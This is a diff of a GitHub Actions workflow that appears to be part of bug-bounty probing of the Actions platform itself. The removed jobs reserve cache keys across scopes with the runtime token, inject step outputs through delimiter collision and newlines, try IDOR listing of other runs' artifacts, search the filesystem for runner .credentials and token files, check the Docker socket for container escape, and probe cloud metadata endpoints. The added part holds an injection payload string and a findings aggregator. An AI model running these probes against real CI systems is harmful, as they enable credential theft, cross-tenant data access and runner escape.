+          echo "" >> input_injection.txt
+          echo '4. YAML injection: "}; system("id"); //' >> input_injection.txt
+          echo '   If input is interpolated into YAML structure' >> input_injection.txt
 
-                        # ---------------------------------------------------------------
-                        # RESERVE test: can we reserve a cache key that belongs to
-                        # a different workflow/branch?
-                        # ---------------------------------------------------------------
-                        echo "" >> cache_api_probe.txt
-                        echo "=== Cache Reserve Test (cross-scope write) ===" >> cache_api_probe.txt
-                        RESERVE_RESP=$(curl -sS -o /tmp/reserve.json -w "%{http_code}" \
-                          -X POST \
-                          -H "Authorization: Bearer $RUNTIME_TOKEN" \
-                          -H "Content-Type: application/json;api-version=6.0-preview.1" \
-                          -H "Accept: application/json" \
-                          "${CACHE_URL}_apis/artifactcache/caches" \
-                          -d "{\"key\":\"vector15b-cross-scope-test-$(date +%s)\",\"version\":\"1\"}" \
-                          2>/dev/null || echo "error")
-                        RESERVE_BODY=$(cat /tmp/reserve.json 2>/dev/null | tr '\n' ' ')
-                        echo "  Reserve status: HTTP $RESERVE_RESP" >> cache_api_probe.txt
-                        echo "  Response: $RESERVE_BODY" >> cache_api_probe.txt
-                        if [[ "$RESERVE_RESP" == "201" ]]; then
-                          CACHE_ID=$(echo "$RESERVE_BODY" | python3 -c "import sys,json; print(json.load(sys.stdin).get('cacheId','?'))" 2>/dev/null)
-                          echo "  ✅ Reserved cache ID=$CACHE_ID" >> cache_api_probe.txt
-                          echo "  NOTE: This proves we can write to the cache service" >> cache_api_probe.txt
-                        fi
+          # ---------------------------------------------------------------
+          # Safe reflection: show the input without executing it
+          # ---------------------------------------------------------------
+          echo "" >> input_injection.txt
+          echo "=== Safe Reflection ===" >> input_injection.txt
+          echo "Input as env var (safe):" >> input_injection.txt
+          env | grep -i "USER_INPUT\|expr_test" >> input_injection.txt 2>/dev/null || true
 
-                        cat cache_api_probe.txt
+          echo "" >> input_injection.txt
+          echo "=== Conclusion ===" >> input_injection.txt
+          echo "The SAFE pattern: pass inputs via env:" >> input_injection.txt
+          echo "The VULN pattern: interpolate directly in run:" >> input_injection.txt
+          echo "  run: echo \\\"\${{ github.event.inputs.param }}\\\"" >> input_injection.txt
+          echo "This is a KNOWN class but still found in many real workflows" >> input_injection.txt
 
-                    - name: Upload cache API probe
-                      uses: actions/upload-artifact@v4
-                      with:
-                        name: vector15b-cache-api-probe
-                        path: cache_api_probe.txt
+          cat input_injection.txt
 
-                # =====================================================================
-                # 15C — GITHUB_OUTPUT / GITHUB_ENV Symlink & Delimiter Attack
-                # =====================================================================
-                file_manipulation:
-                  runs-on: ubuntu-latest
-                  outputs:
-                    injected_output: ${{ steps.delimiter_test.outputs.injected_output }}
-                  steps:
-                    - name: "15C: GITHUB_OUTPUT file analysis"
-                      run: |
-                        echo "=== 15C: GITHUB_OUTPUT/ENV File Analysis ===" > file_analysis.txt
+      - name: Upload input injection analysis
+        uses: actions/upload-artifact@v4
+        with:
+          name: vector16j-input-injection
+          path: input_injection.txt
+  # ===================================================================
+  # FINAL: Aggregate all findings
+  # ===================================================================
+  aggregate:
+    runs-on: ubuntu-latest
+    needs: [token_downscope_audit, git_protocol_attack, graphql_attack,
+            race_conditions, log_injection, expression_engine,
+            zipslip_test, network_probe, token_differential, input_injection]
+    if: always()
+    steps:
+      - name: Download all artifacts
+        uses: actions/download-artifact@v4
+        with:
+          path: all-results/
 
-                        # Analyze the GITHUB_OUTPUT file
-                        echo "GITHUB_OUTPUT path: $GITHUB_OUTPUT" >> file_analysis.txt
-                        echo "GITHUB_ENV path: $GITHUB_ENV" >> file_analysis.txt
-                        echo "GITHUB_STATE path: ${GITHUB_STATE:-[NOT_SET]}" >> file_analysis.txt
-                        echo "GITHUB_PATH path: $GITHUB_PATH" >> file_analysis.txt
-                        echo "GITHUB_STEP_SUMMARY path: $GITHUB_STEP_SUMMARY" >> file_analysis.txt
+      - name: Aggregate findings
+        run: |
+          echo "=========================================================" > final_report.txt
+          echo "  VECTOR 16 — ADVANCED PLATFORM EXPLOITATION" >> final_report.txt
+          echo "  Final Aggregated Report" >> final_report.txt
+          echo "  $(date -u +%Y-%m-%dT%H:%M:%SZ)" >> final_report.txt
+          echo "=========================================================" >> final_report.txt
+          echo "" >> final_report.txt
 
-                        # File permissions and ownership
-                        echo "" >> file_analysis.txt
-                        echo "=== File Permissions ===" >> file_analysis.txt
-                        ls -la "$GITHUB_OUTPUT" >> file_analysis.txt 2>/dev/null || echo "GITHUB_OUTPUT not found" >> file_analysis.txt
-                        ls -la "$GITHUB_ENV" >> file_analysis.txt 2>/dev/null
-                        ls -la "$GITHUB_PATH" >> file_analysis.txt 2>/dev/null
-                        ls -la "$GITHUB_STEP_SUMMARY" >> file_analysis.txt 2>/dev/null
+          # Count findings across all sub-vectors
+          TOTAL_FINDINGS=0
+          CRITICAL=0
+          HIGH=0
 
-                        # Check if files are in a predictable location
-                        echo "" >> file_analysis.txt
-                        echo "=== File Locations (predictability) ===" >> file_analysis.txt
-                        echo "All share parent: $(dirname "$GITHUB_OUTPUT")" >> file_analysis.txt
-                        ls -la "$(dirname "$GITHUB_OUTPUT")/" >> file_analysis.txt 2>/dev/null
+          for f in all-results/**/*.txt; do
+            [[ -f "$f" ]] || continue
+            ARTIFACT_NAME=$(basename "$(dirname "$f")")
+            echo "" >> final_report.txt
+            echo "--- $ARTIFACT_NAME ---" >> final_report.txt
 
-                        # ---------------------------------------------------------------
-                        # SYMLINK RACE ATTACK:
-                        # If another concurrent step or process can replace $GITHUB_OUTPUT
-                        # with a symlink to a sensitive file BEFORE the runner reads it,
-                        # the output injection writes to the symlink target instead.
-                        #
-                        # Test: Can we create a symlink pointing to another file?
-                        # ---------------------------------------------------------------
-                        echo "" >> file_analysis.txt
-                        echo "=== Symlink Race Test ===" >> file_analysis.txt
+            # Extract finding lines
+            FINDINGS=$(grep -iE "FINDING|CRITICAL|🔴|UNEXPECTEDLY ALLOWED" "$f" 2>/dev/null || true)
+            if [[ -n "$FINDINGS" ]]; then
+              echo "$FINDINGS" >> final_report.txt
+              F_COUNT=$(echo "$FINDINGS" | wc -l)
+              TOTAL_FINDINGS=$((TOTAL_FINDINGS + F_COUNT))
+              C=$(echo "$FINDINGS" | grep -ic "CRITICAL" || true)
+              CRITICAL=$((CRITICAL + C))
+              H=$(echo "$FINDINGS" | grep -ic "HIGH\|FINDING" || true)
+              HIGH=$((HIGH + H))
+            else
+              echo "  No findings (controls validated)" >> final_report.txt
+            fi
+          done
 
-                        ORIGINAL_FILE="$GITHUB_OUTPUT"
-                        TEMP_BACKUP="/tmp/github_output_backup_$$"
+          echo "" >> final_report.txt
+          echo "=========================================================" >> final_report.txt
+          echo "  TOTALS" >> final_report.txt
+          echo "  total_findings=$TOTAL_FINDINGS" >> final_report.txt
+          echo "  critical=$CRITICAL" >> final_report.txt
+          echo "  high=$HIGH" >> final_report.txt
+          echo "=========================================================" >> final_report.txt
 
-                        # Check if GITHUB_OUTPUT is already a symlink
-                        if [[ -L "$GITHUB_OUTPUT" ]]; then
-                          echo "FINDING: GITHUB_OUTPUT is already a symlink!" >> file_analysis.txt
-                          echo "  Target: $(readlink -f "$GITHUB_OUTPUT")" >> file_analysis.txt
-                        else
-                          echo "GITHUB_OUTPUT is a regular file (expected)" >> file_analysis.txt
-                        fi
+          if [[ $TOTAL_FINDINGS -gt 0 ]]; then
+            echo "" >> final_report.txt
+            echo "⚠️  FINDINGS DETECTED — Review individual artifacts" >> final_report.txt
+            echo "Each finding with 🔴 should be triaged for bounty eligibility" >> final_report.txt
+          else
+            echo "" >> final_report.txt
+            echo "✅ All invariants held — no exploitable findings" >> final_report.txt
+          fi
 
-                        # Check if we can rename/replace the file
-                        # (DO NOT actually do it — just check permissions)
-                        PARENT_DIR="$(dirname "$GITHUB_OUTPUT")"
-                        if [[ -w "$PARENT_DIR" ]]; then
-                          echo "FINDING: Parent directory is writable!" >> file_analysis.txt
-                          echo "  An attacker could replace GITHUB_OUTPUT with a symlink" >> file_analysis.txt
-                          echo "  during a race window between steps" >> file_analysis.txt
-                        else
-                          echo "Parent directory is NOT writable (safe)" >> file_analysis.txt
-                        fi
+          cat final_report.txt
 
-                        # Check file descriptor info
-                        echo "" >> file_analysis.txt
-                        echo "=== Process File Descriptors ===" >> file_analysis.txt
-                        ls -la /proc/self/fd/ 2>/dev/null | head -20 >> file_analysis.txt || echo "No /proc/self/fd" >> file_analysis.txt
-
-                        cat file_analysis.txt
-
-                    - name: "15D: GITHUB_OUTPUT Delimiter Collision Test"
-                      id: delimiter_test
-                      run: |
-                        echo "=== 15D: Delimiter Collision Test ===" > delimiter_test.txt
-
-                        # ---------------------------------------------------------------
-                        # Modern GITHUB_OUTPUT uses heredoc-style delimiters:
-                        # echo "name<<DELIMITER" >> $GITHUB_OUTPUT
-                        # echo "value" >> $GITHUB_OUTPUT
-                        # echo "DELIMITER" >> $GITHUB_OUTPUT
-                        #
-                        # If an attacker knows/predicts the delimiter, they can inject
-                        # a line that terminates the current output and starts a new one.
-                        #
-                        # Test: Use a known delimiter and embed it in the value
-                        # ---------------------------------------------------------------
-
-                        # Set a normal output using heredoc
-                        DELIMITER="ghadelimiter_$(openssl rand -hex 4)"
-                        {
-                          echo "normal_output<<${DELIMITER}"
-                          echo "this is the intended value"
-                          echo "${DELIMITER}"
-                        } >> "$GITHUB_OUTPUT"
-                        echo "normal_delimiter=$DELIMITER" >> delimiter_test.txt
-
-                        # ATTACK ATTEMPT: output value CONTAINS the delimiter string
-                        # If the runner doesn't properly handle this, the output is truncated
-                        # and subsequent lines become new outputs
-                        ATTACK_DELIM="ghadelimiter_$(openssl rand -hex 4)"
-                        {
-                          echo "attack_test<<${ATTACK_DELIM}"
-                          echo "safe start"
-                          echo "${ATTACK_DELIM}"
-                          echo "injected_output<<EOF_INJECTED"
-                          echo "THIS_SHOULD_NOT_BE_AN_OUTPUT"
-                          echo "EOF_INJECTED"
-                        } >> "$GITHUB_OUTPUT"
-                        echo "attack_delimiter=$ATTACK_DELIM" >> delimiter_test.txt
-
-                        # Check what's in GITHUB_OUTPUT after our writes
-                        echo "" >> delimiter_test.txt
-                        echo "=== GITHUB_OUTPUT contents after test ===" >> delimiter_test.txt
-                        cat "$GITHUB_OUTPUT" >> delimiter_test.txt 2>/dev/null
-
-                        # Test: Simple key=value injection via newline in value
-                        printf 'simple_test=safe_value\ninjected_key=injected_value_15d\n' >> "$GITHUB_OUTPUT"
-                        echo "" >> delimiter_test.txt
-                        echo "=== Newline injection attempt in key=value format ===" >> delimiter_test.txt
-                        echo "Attempted: simple_test=safe_value\\ninjected_key=injected_value_15d" >> delimiter_test.txt
-
-                        cat delimiter_test.txt
-
-                    - name: "15D: Check if injection succeeded"
-                      run: |
-                        echo "=== Delimiter Injection Results ===" > injection_results.txt
-                        echo "normal_output=${{ steps.delimiter_test.outputs.normal_output }}" >> injection_results.txt
-                        echo "attack_test=${{ steps.delimiter_test.outputs.attack_test }}" >> injection_results.txt
-                        echo "injected_output=${{ steps.delimiter_test.outputs.injected_output }}" >> injection_results.txt
-                        echo "simple_test=${{ steps.delimiter_test.outputs.simple_test }}" >> injection_results.txt
-                        echo "injected_key=${{ steps.delimiter_test.outputs.injected_key }}" >> injection_results.txt
-
-                        # FINDING CRITERIA:
-                        # If injected_output = "THIS_SHOULD_NOT_BE_AN_OUTPUT" → delimiter collision works
-                        # If injected_key = "injected_value_15d" → newline injection in key=value works
-                        if [[ "${{ steps.delimiter_test.outputs.injected_output }}" == "THIS_SHOULD_NOT_BE_AN_OUTPUT" ]]; then
-                          echo "🔴 CRITICAL FINDING: Delimiter collision succeeded!" >> injection_results.txt
-                          echo "  An attacker can inject arbitrary step outputs by embedding the delimiter" >> injection_results.txt
-                        elif [[ "${{ steps.delimiter_test.outputs.injected_key }}" == "injected_value_15d" ]]; then
-                          echo "🔴 HIGH FINDING: Newline injection in key=value format!" >> injection_results.txt
-                        else
-                          echo "✅ Both injection attempts blocked (expected)" >> injection_results.txt
-                        fi
-
-                        cat injection_results.txt
-
-                    - name: Upload file manipulation results
-                      uses: actions/upload-artifact@v4
-                      with:
-                        name: vector15cd-file-manipulation
-                        path: |
-                          file_analysis.txt
-                          delimiter_test.txt
-                          injection_results.txt
-
-                # =====================================================================
-                # 15F — Artifact Service Direct Manipulation
-                # =====================================================================
-                artifact_service_probe:
-                  runs-on: ubuntu-latest
-                  needs: jwt_analysis
-                  steps:
-                    - name: "15F: Direct Artifact Service API probe"
-                      run: |
-                        echo "=== 15F: Artifact Service Direct Manipulation ===" > artifact_probe.txt
-                        echo "timestamp=$(date -u +%Y-%m-%dT%H:%M:%SZ)" >> artifact_probe.txt
-
-                        RUNTIME_URL="${ACTIONS_RUNTIME_URL:-}"
-                        RUNTIME_TOKEN="${ACTIONS_RUNTIME_TOKEN:-}"
-                        RESULTS_URL="${ACTIONS_RESULTS_URL:-}"
-
-                        # ---------------------------------------------------------------
-                        # Modern artifact protocol uses Twirp (protobuf-over-HTTP)
-                        # at ACTIONS_RESULTS_URL + twirp/github.actions.results.api.v1.*
-                        # ---------------------------------------------------------------
-                        if [[ -n "$RESULTS_URL" ]]; then
-                          echo "results_url=$RESULTS_URL" >> artifact_probe.txt
-                          echo "" >> artifact_probe.txt
-                          echo "=== Results Service Endpoints ===" >> artifact_probe.txt
-
-                          TWIRP_ENDPOINTS=(
-                            "twirp/github.actions.results.api.v1.ArtifactService/ListArtifacts"
-                            "twirp/github.actions.results.api.v1.ArtifactService/GetSignedArtifactURL"
-                            "twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact"
-                            "twirp/github.actions.results.api.v1.ArtifactService/FinalizeArtifact"
-                            "twirp/github.actions.results.api.v1.CacheService/ListCacheEntries"
-                            "twirp/github.actions.results.api.v1.CacheService/CreateCacheEntry"
-                            "twirp/github.actions.results.api.v1.CacheService/GetCacheEntryDownloadURL"
-                          )
-
-                          for ep in "${TWIRP_ENDPOINTS[@]}"; do
-                            # Twirp uses POST with protobuf/json body
-                            RESP=$(curl -sS -o /tmp/twirp_resp.json -w "%{http_code}" \
-                              -X POST \
-                              -H "Authorization: Bearer $RUNTIME_TOKEN" \
-                              -H "Content-Type: application/json" \
-                              "${RESULTS_URL}${ep}" \
-                              -d '{"workflow_run_backend_id":"'${{ github.run_id }}'","workflow_job_run_backend_id":"1"}' \
-                              2>/dev/null || echo "error")
-                            BODY=$(head -c 300 /tmp/twirp_resp.json 2>/dev/null | tr '\n' ' ')
-                            echo "  $ep → HTTP $RESP" >> artifact_probe.txt
-                            if [[ "$RESP" == "200" ]]; then
-                              echo "    ✅ ACCESSIBLE: $BODY" >> artifact_probe.txt
-                            elif [[ "$RESP" == "400" ]]; then
-                              echo "    ⚠️  BAD_REQUEST (endpoint exists, wrong params): $BODY" >> artifact_probe.txt
-                            else
-                              echo "    Response: $BODY" >> artifact_probe.txt
-                            fi
-                          done
-
-                          # ---------------------------------------------------------------
-                          # IDOR: Try listing artifacts for a different workflow run
-                          # ---------------------------------------------------------------
-                          echo "" >> artifact_probe.txt
-                          echo "=== Artifact IDOR via Results API ===" >> artifact_probe.txt
-                          CURRENT_RUN="${{ github.run_id }}"
-                          for test_run in "$((CURRENT_RUN - 1))" "1" "$((CURRENT_RUN + 100))"; do
-                            IDOR_RESP=$(curl -sS -o /tmp/idor_art.json -w "%{http_code}" \
-                              -X POST \
-                              -H "Authorization: Bearer $RUNTIME_TOKEN" \
-                              -H "Content-Type: application/json" \
-                              "${RESULTS_URL}twirp/github.actions.results.api.v1.ArtifactService/ListArtifacts" \
-                              -d "{\"workflow_run_backend_id\":\"${test_run}\"}" \
-                              2>/dev/null || echo "error")
-                            IDOR_BODY=$(head -c 300 /tmp/idor_art.json 2>/dev/null | tr '\n' ' ')
-                            echo "  ListArtifacts(run=$test_run) → HTTP $IDOR_RESP" >> artifact_probe.txt
-                            if [[ "$IDOR_RESP" == "200" ]]; then
-                              ART_COUNT=$(echo "$IDOR_BODY" | python3 -c "
-              import sys,json
-              try:
-                  d=json.load(sys.stdin)
-                  arts=d.get('artifacts',[])
-                  print(f'{len(arts)} artifacts found')
-                  for a in arts[:5]:
-                      print(f'  name={a.get(\"name\",\"?\")} size={a.get(\"size\",0)}')
-              except: print('PARSE_ERROR')
-              " 2>/dev/null || echo "PARSE_ERROR")
-                              echo "    🔴 RESULT: $ART_COUNT" >> artifact_probe.txt
-                              if echo "$ART_COUNT" | grep -q "artifacts found" && ! echo "$ART_COUNT" | grep -q "^0 "; then
-                                echo "    FINDING: Accessed artifacts from run $test_run (IDOR)!" >> artifact_probe.txt
-                              fi
-                            fi
-                          done
-                        else
-                          echo "ACTIONS_RESULTS_URL not set (older runner?)" >> artifact_probe.txt
-                          echo "Falling back to legacy artifact API..." >> artifact_probe.txt
-
-                          # Legacy artifact API via ACTIONS_RUNTIME_URL
-                          if [[ -n "$RUNTIME_URL" ]]; then
-                            LEGACY_RESP=$(curl -sS -o /tmp/legacy_art.json -w "%{http_code}" \
-                              -H "Authorization: Bearer $RUNTIME_TOKEN" \
-                              "${RUNTIME_URL}_apis/pipelines/workflows/${{ github.run_id }}/artifacts" \
-                              2>/dev/null || echo "error")
-                            echo "Legacy artifact API: HTTP $LEGACY_RESP" >> artifact_probe.txt
-                            head -c 500 /tmp/legacy_art.json >> artifact_probe.txt 2>/dev/null
-                          fi
-                        fi
-
-                        cat artifact_probe.txt
-
-                    - name: Upload artifact probe
-                      uses: actions/upload-artifact@v4
-                      with:
-                        name: vector15f-artifact-probe
-                        path: artifact_probe.txt
-
-                # =====================================================================
-                # 15G — Runner Filesystem Secrets Discovery
-                # =====================================================================
-                runner_filesystem:
-                  runs-on: ubuntu-latest
-                  steps:
-                    - name: "15G: Runner filesystem deep audit"
-                      run: |
-                        echo "=== 15G: Runner Filesystem Deep Audit ===" > fs_audit.txt
-                        echo "timestamp=$(date -u +%Y-%m-%dT%H:%M:%SZ)" >> fs_audit.txt
-
-                        # ---------------------------------------------------------------
-                        # The runner writes sensitive data to temp files and working dirs.
-                        # Can we find tokens, secrets, or internal state files?
-                        # ---------------------------------------------------------------
-
-                        echo "" >> fs_audit.txt
-                        echo "=== Runner Working Directory ===" >> fs_audit.txt
-                        echo "HOME=$HOME" >> fs_audit.txt
-                        echo "RUNNER_WORKSPACE=$RUNNER_WORKSPACE" >> fs_audit.txt
-                        echo "RUNNER_TEMP=$RUNNER_TEMP" >> fs_audit.txt
-                        echo "RUNNER_TOOL_CACHE=$RUNNER_TOOL_CACHE" >> fs_audit.txt
-
-                        # Search for files containing tokens/credentials
-                        echo "" >> fs_audit.txt
-                        echo "=== Sensitive File Discovery ===" >> fs_audit.txt
-
-                        # Look for .credentials files (runner registration)
-                        find / -name ".credentials*" -type f 2>/dev/null | head -10 >> fs_audit.txt || true
-
-                        # Look for .runner files
-                        find / -name ".runner" -type f 2>/dev/null | head -10 >> fs_audit.txt || true
-
-                        # Look for token files in runner directories
-                        find /home/runner -name "*token*" -o -name "*secret*" -o -name "*credential*" 2>/dev/null | head -20 >> fs_audit.txt || true
-
-                        # Check runner's internal config
-                        echo "" >> fs_audit.txt
-                        echo "=== Runner Internal Config ===" >> fs_audit.txt
-                        for f in /home/runner/runners/*/.env /home/runner/runners/*/.credentials \
-                                /home/runner/runners/*/.credentials_rsaparams; do
-                          if [[ -f "$f" ]]; then
-                            echo "FOUND: $f ($(wc -c < "$f")b)" >> fs_audit.txt
-                            # Show structure without exposing values
-                            head -5 "$f" | sed 's/=.*/=[REDACTED]/' >> fs_audit.txt
-                          fi
-                        done
-
-                        # Docker socket (container escape vector)
-                        echo "" >> fs_audit.txt
-                        echo "=== Container Escape Vectors ===" >> fs_audit.txt
-                        if [[ -S "/var/run/docker.sock" ]]; then
-                          echo "🔴 FINDING: Docker socket accessible!" >> fs_audit.txt
-                          echo "  An attacker with runner access can escape to the host" >> fs_audit.txt
-                          docker info 2>/dev/null | head -5 >> fs_audit.txt || echo "  (docker command not available)" >> fs_audit.txt
-                        else
-                          echo "Docker socket: NOT accessible (expected)" >> fs_audit.txt
-                        fi
-
-                        # Check for other processes (multi-tenant risk)
-                        echo "" >> fs_audit.txt
-                        echo "=== Process Isolation ===" >> fs_audit.txt
-                        ps aux 2>/dev/null | head -30 >> fs_audit.txt || true
-
-                        # Network interfaces (container networking)
-                        echo "" >> fs_audit.txt
-                        echo "=== Network Interfaces ===" >> fs_audit.txt
-                        ip addr 2>/dev/null | head -30 >> fs_audit.txt || ifconfig 2>/dev/null | head -30 >> fs_audit.txt || true
-
-                        # Metadata service (cloud provider escape)
-                        echo "" >> fs_audit.txt
-                        echo "=== Cloud Metadata Service Probe ===" >> fs_audit.txt
-                        for endpoint in "http://169.254.169.254/latest/meta-data/" \
-                                        "http://metadata.google.internal/computeMetadata/v1/" \
-                                        "http://169.254.169.254/metadata/instance"; do
-                          META_RESP=$(curl -sS -o /dev/null -w "%{http_code}" \
-                            -H "Metadata-Flavor: Google" \
-                            --connect-timeout 2 --max-time 3 \
-                            "$endpoint" 2>/dev/null || echo "error")
-                          echo "  $endpoint → $META_RESP" >> fs_audit.txt
-                          if [[ "$META_RESP" == "200" ]]; then
-                            echo "  🔴 FINDING: Cloud metadata service accessible!" >> fs_audit.txt
-                          fi
-                        done
-
-                        cat fs_audit.txt
-
-                    - name: Upload filesystem audit
-                      uses: actions/upload-artifact@v4
-                      with:
-                        name: vector15g-filesystem-audit
-                        path: fs_audit.txt
+      - name: Upload final report
+        uses: actions/upload-artifact@v4
+        with:
+          name: vector16-FINAL-REPORT
+          path: final_report.txt
